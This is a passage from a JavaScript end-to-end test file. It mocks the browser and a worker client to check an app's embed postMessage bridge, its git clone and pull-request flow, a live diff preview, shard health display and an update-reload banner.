      byId.get('composer-model-select').value = 'uor-r4.qwen3-0.6b-holo';
      const bodyEl = new MiniEl('body');
      const winListeners = {};
      const postedMessages = [];
      let reloadedCount = 0;
      const rpcCalls = [];

      const mockDocument = {
        body: bodyEl,
        getElementById: (id) => byId.get(id) || null,
        createElement: () => new MiniEl(),
        createTextNode: (t) => ({ textContent: String(t) }),
        querySelectorAll: () => [],
        addEventListener: () => {},
      };
      const parentWin = { postMessage: (msg) => postedMessages.push(msg) };
      const mockWindow = {
        parent: parentWin,
        location: { search: '?embed=me', hash: '', reload: () => { reloadedCount += 1; } },
        addEventListener: (t, fn) => (winListeners[t] ||= []).push(fn),
      };
      const mockAppState = {
        ui: {},
        config: {
          connectedGitRepo: '',
          connectedGitBranch: 'main',
          gitBranches: ['main'],
          gitBaselineFiles: {},
          gitLazyPaths: [],
          activePrNumber: null,
          activePrUrl: '',
          ciSummary: 'CI & Pages: Standby',
        },
        workspace: { pendingPatches: {} },
      };
      const mockEngineWorkerClient = {
        enabled: true,
        ready: true,
        githubConnected: true,
        stitchHealth: {
          scheme: 'stitch/xor-2-of-3/1',
          custodyMode: '2-of-3 XOR Parity + SHA-256',
          verifiedShards: 2,
          totalShards: 3,
          healedShards: 1,
          healedDetails: [{ file: 'shard_000.bin' }],
          activeSources: [`${baseHttp}/weights-primary/`],
          status: 'Healed via 2-of-3 Parity',
        },
        packInfo: { status: 'ok', point_rows: 17408, reply_entries: 1024 },
        gllmInfo: { n_layers: 16, d_model: 256 },
        workspaceFiles: new Map([
          ['src/lib.rs', { path: 'src/lib.rs', content: 'pub fn v() -> u32 { 1 }\n', lazy: false, line_count: 1 }],
        ]),
        getWorkspaceListObject() {
          return { status: 'ok', files: Array.from(this.workspaceFiles.values()) };
        },
        async rpc(op, payload) {
          rpcCalls.push({ op, payload });
          if (op === 'force_refresh_reload') return { ok: true, reloadedWasm: true };
          if (op === 'host_bridge_exec' && payload && payload.op === 'git') {
            if (payload.subcommand === 'connect') {
              return { ok: true, repo: payload.repo, default_branch: 'main', branches: ['main', 'feat/ui'] };
            }
            if (payload.subcommand === 'clone') {
              const files = [{ path: 'src/lib.rs', content: 'pub fn v() -> u32 { 1 }\n', lazy: false }];
              this.workspaceFiles.set('src/lib.rs', { path: 'src/lib.rs', content: 'pub fn v() -> u32 { 1 }\n', lazy: false, line_count: 1 });
              return { ok: true, repo: payload.repo, branch: payload.branch || 'main', branches: ['main', 'feat/ui'], files, lazy_paths: [] };
            }
            if (payload.subcommand === 'create_pr') {
              return { ok: true, pr_number: 42, html_url: 'https://github.com/acme/any-repo/pull/42' };
            }
            if (payload.subcommand === 'watch_deploy') {
              return { ok: true, pages_status: 'built', update_available: true, adapter_wasm_sha256: 'deadbeef12345678' };
            }
          }
          return { ok: true };
        },
      };

      const diffStart = rawJs.indexOf('function computeUnifiedDiffJs(');
      const diffEnd = rawJs.indexOf('function renderInteractiveArtifactPreview(', diffStart);
      const scmStart = rawJs.indexOf('function renderCursorScmSection(');
      const scmEnd = rawJs.indexOf('function renderCursorEditorTabs(', scmStart);
      const ctrlStart = rawJs.indexOf('function showStudioUpdateBanner(');
      const ctrlEnd = rawJs.indexOf('function initLayoutAndConnectedControls(', ctrlStart);
      const initCtrlEnd = rawJs.indexOf('\n  if (saveRelayUrlBtn)', ctrlEnd);
      const snippet = [
        rawJs.slice(diffStart, diffEnd),
        'function computeCursorGitStatusForFile(f) { return { badge: "", cls: "", delta: `${f.line_count || 1}L` }; }',
        'function activateCanvasTab() {}',
        'function selectWorkspaceFile() {}',
        'function renderThreadSidebar() {}',
        'function setLayoutMode() {}',
        'function getActiveThread() { return { messages: [{ role: "user", text: "hi" }, { role: "assistant", text: "ok" }] }; }',
        'function initPrismHoloIdentityControls() {}',
        'function renderPrismHoloIdentityUI() {}',
        'let activeWorkspacePath = "src/lib.rs";',
        rawJs.slice(scmStart, scmEnd),
        rawJs.slice(ctrlStart, initCtrlEnd),
        '  initEmbedMeBridge();',
        '  updateDynamicPlanningPanel();',
        '  renderDynamicPoolPanel();',
        '  renderCoworkStatusBar();',
        '  renderCursorShardsSection();',
        '}',
        'return { showStudioUpdateBanner, updateDynamicPlanningPanel, renderDynamicPoolPanel, renderCoworkStatusBar, renderCursorScmSection, renderCursorShardsSection, runGitHubLoopAction, initLayoutAndConnectedControls };',
      ].join('\n');

      const uiApi = new Function(
        'document', 'window', 'AppState', 'engineWorkerClient', 'inspectorsModalEl',
        'openInspectorsModal', 'closeInspectorsModal', 'renderWorkspaceList', 'secopsAudit',
        snippet
      )(mockDocument, mockWindow, mockAppState, mockEngineWorkerClient, null, () => {}, () => {}, () => {}, { recordEvent: () => {} });

      uiApi.initLayoutAndConnectedControls();
      assert.equal(bodyEl.dataset.embed, 'me');
      assert.equal(bodyEl.classList.contains('embed-me-compact'), true);
      assert.equal(postedMessages[0].type, 'prism:ready');
      assert.equal(postedMessages[0].schema, 'prism/r4-workspace/1');

      // Test inbound prism:open-repo -> outbound prism:status
      for (const fn of winListeners.message || []) {
        await fn({ data: { type: 'prism:open-repo', repo: 'acme/any-repo', branch: 'feat/ui' }, source: parentWin });
      }
      const statusEv = postedMessages.filter((m) => m.type === 'prism:status' && m.repo === 'acme/any-repo').pop();
      assert.ok(statusEv, 'Expected prism:status message after prism:open-repo');
      assert.equal(statusEv.branch, 'feat/ui');

      // Edit file -> check live SCM unified diff preview, Planning DAG & Pool grid, Cowork status bar & Shards card
      mockEngineWorkerClient.workspaceFiles.set('src/lib.rs', {
        path: 'src/lib.rs',
        content: 'pub fn v() -> u32 { 2 }\n',
        lazy: false,
        line_count: 1,
      });
      uiApi.renderCursorScmSection(mockEngineWorkerClient.getWorkspaceListObject());
      assert.ok(byId.get('scm-live-diff-preview').textContent.includes('+pub fn v() -> u32 { 2 }'));
      assert.ok(byId.get('plan-dag-diagram').children.length >= 4);
      assert.ok(byId.get('plan-checklist').children.length >= 4);
      assert.equal(byId.get('pool-status-grid').children.length, 4);
      assert.equal(byId.get('cursor-shards-grid').children.length, 16);
      assert.ok(byId.get('live-context-turn-digest').textContent.includes('uor-r4.qwen3-0.6b-holo'));
      assert.ok(byId.get('stitch-custody-health-card').children[1].textContent.includes('Parity-Healed 1'));

      // Test watch_deploy provenance update banner -> click Refresh & Reload Now -> force_refresh_reload + location.reload()
      await uiApi.runGitHubLoopAction('watch_deploy', {});
      assert.equal(byId.get('studio-update-banner').hasAttribute('hidden'), false);
      assert.ok(byId.get('studio-update-banner-text').textContent.includes('New Studio Version Live'));
      await byId.get('studio-refresh-reload-btn').click();
      await new Promise((r) => setTimeout(r, 20));
      assert.ok(rpcCalls.some((c) => c.op === 'force_refresh_reload'), 'Refresh button must call force_refresh_reload RPC');
      assert.equal(reloadedCount, 1, 'Refresh button must invoke window.location.reload()');
      console.log('  ✓ Live app.js ?embed=me postMessage, Planning/Pool/Cowork/SCM Diff & Update Reload Banner verified');
    }
    console.log('=== ALL GITHUB ROUNDTRIP & STITCH E2E CHECKS PASSED ===');
  } finally {
    await relayHandle.close();
    await new Promise((resolve) => mockServer.close(resolve));
  }
}

await runSuite();
